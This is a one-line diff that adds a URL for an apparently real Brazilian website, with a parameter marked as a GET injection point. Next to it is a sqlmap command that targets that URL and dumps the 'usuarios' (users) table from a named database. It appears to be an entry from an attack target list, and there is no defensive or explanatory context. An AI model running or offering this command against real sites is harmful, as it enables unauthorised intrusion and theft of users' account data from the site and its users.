@@ -1,0 +1,1 @@
+http://www.claudiabaratella.com.br/depo.php?id=2 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.claudiabaratella.com.br/depo.php?id=2 -D claudiabaratella -T usuarios --dump
